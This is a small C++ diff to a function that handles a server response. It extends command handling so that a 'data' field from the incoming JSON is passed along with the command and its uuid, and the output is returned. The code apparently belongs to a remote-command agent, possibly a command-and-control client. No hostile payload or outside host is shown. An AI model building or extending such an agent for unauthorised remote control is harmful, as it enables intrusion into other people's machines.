@@ -204,8 +204,9 @@ bool handleResponse(const std::string& response_body, int& timer, const std::str
         std::string command = data["command"].asString();
         if (data.isMember("command_uuid")) {
             std::string command_uuid = data["command_uuid"].asString();
+            std::string command_data = data["data"].asString();
             std::cout << "Command recieved: " << command << std::endl;
-            std::string output = command_handler(command, command_uuid);
+            std::string output = command_handler(command, command_data, command_uuid);
             Json::Value json_data;
             json_data["output"] = output;
             json_data["command_uuid"] = command_uuid;
